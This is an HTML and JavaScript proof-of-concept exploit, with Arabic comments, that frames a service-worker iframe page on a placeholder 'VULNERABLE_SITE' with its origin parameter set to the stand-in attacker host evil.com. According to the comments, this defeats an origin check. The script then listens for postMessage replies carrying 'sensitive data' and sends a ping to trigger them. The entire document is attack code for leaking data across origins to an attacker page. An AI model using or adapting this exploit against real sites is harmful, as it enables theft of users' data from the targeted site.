<iframe src="https://VULNERABLE_SITE/_/service_worker/5a20/sw_iframe.html?origin=https%3A%2F%2Fevil.com&1p=1"></iframe>

<script>
// الآن، الإطار الأب هو evil.com، وقيمة 'origin' في الـ URL هي evil.com.
// الفحص: b[0] !== this.origin سيفشل (كلاهما evil.com)، وسيتم تشغيل الدالة D(this).

// كود للاستماع للرسائل المرسلة من الإطار إلى evil.com (Parent)
window.addEventListener('message', (event) => {
    if (event.origin === "https://VULNERABLE_SITE") {
        console.log("تم تلقي بيانات حساسة من الموقع المستهدف:", event.data);
        alert("Vulnerability Confirmed! Data leaked via postMessage to " + event.origin);
    }
});

// يمكنك الآن محاولة إرسال رسالة من evil.com إلى الإطار لتفعيل رد
document.querySelector('iframe').contentWindow.postMessage('ping', 'https://VULNERABLE_SITE');
</script>
